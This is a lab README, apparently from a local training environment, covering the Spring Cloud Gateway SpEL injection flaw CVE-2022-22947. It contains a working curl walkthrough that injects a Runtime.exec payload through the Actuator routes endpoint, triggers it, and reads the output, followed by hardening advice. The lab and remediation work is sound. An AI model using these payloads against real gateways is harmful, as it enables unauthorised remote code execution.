# Spring Cloud Gateway Code Injection RCE (CVE-2022-22947)

## Overview

CVE-2022-22947 is a critical remote code execution vulnerability in VMware Spring Cloud Gateway (versions prior to 3.1.1+ and 3.0.7+). Applications using Spring Cloud Gateway with an exposed, unauthenticated, or misconfigured Actuator endpoint (`/actuator/gateway/routes`) are vulnerable to arbitrary SpEL (Spring Expression Language) code injection.

An attacker can craft a new route definition containing malicious SpEL expressions embedded inside filter arguments (such as `AddResponseHeader`). When the gateway refreshes its route definitions (`POST /actuator/gateway/refresh`), the SpEL expression is parsed and evaluated by the Spring framework, executing arbitrary operating system commands inside the host Java runtime.

- **Primary Interface**: `http://localhost:8125`
- **Docker Shortcut**: `./lab start spring-gateway`
- **Container Name**: `cyberlab_04_spring_gateway_rce`
- **RAM Footprint**: ~250 MB

---

## Architecture & Attack Chain

```
+-------------------------------------------------------------+
|                Attacker (curl / Python script)              |
+-------------------------------------------------------------+
                               |
                   Step 1: POST /actuator/gateway/routes/hack
                   Payload: SpEL payload inside AddResponseHeader
                               v
+-------------------------------------------------------------+
|                     Spring Cloud Gateway                    |
|                                                             |
|  1. Stores new route definition with predicate & filter     |
|                                                             |
|  Step 2: POST /actuator/gateway/refresh                     |
|  2. Gateway reloads routes, compiles SpEL expressions       |
|  3. SpEL engine executes java.lang.Runtime.getRuntime()     |
|                                                             |
|  Step 3: GET /actuator/gateway/routes/hack                  |
|  4. Injected response header echoes command execution       |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Register a Malicious Route with SpEL Injection

Send a POST request to create a route with an injected SpEL command:

```bash
curl -i -s -X POST 'http://localhost:8125/actuator/gateway/routes/pwn' \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "pwn",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com"
  }'
```

The gateway responds with `HTTP/1.1 201 Created`.

### 2. Trigger Route Refresh

Trigger the gateway Actuator to evaluate the new route and execute the payload:

```bash
curl -i -s -X POST 'http://localhost:8125/actuator/gateway/refresh'
```

### 3. Retrieve Output & Cleanup

Inspect the created route to view the command execution results reflected in the response header:

```bash
curl -s 'http://localhost:8125/actuator/gateway/routes/pwn' | jq .
```

To delete the injected route and clean up:

```bash
curl -s -X DELETE 'http://localhost:8125/actuator/gateway/routes/pwn'
curl -s -X POST 'http://localhost:8125/actuator/gateway/refresh'
```

---

## Defensive Remediation & Hardening

1. **Upgrade Spring Cloud Gateway**:
   Upgrade to Spring Cloud Gateway 3.1.1, 3.0.7, or newer.
2. **Disable or Restrict Actuator Endpoints**:
   Disable the gateway actuator endpoint if remote management is unnecessary:
   ```properties
   management.endpoint.gateway.enabled=false
   management.endpoints.web.exposure.exclude=gateway
   ```
3. **Mandate Spring Security Authentication**:
   If Actuator must be exposed, protect endpoints behind Spring Security with role-based authentication.

---

## Video Walkthroughs & Technical References

- [#spring cloud gateway remote code execution | CVE-2022-22947](https://www.youtube.com/watch?v=mX3MtC6psJA)
- [VMware Spring Cloud Gateway Security Advisory](https://tanzu.vmware.com/security/cve-2022-22947)
- [Vulhub Spring Cloud Gateway Advisory](https://vulhub.org/#/environments/spring/CVE-2022-22947/)
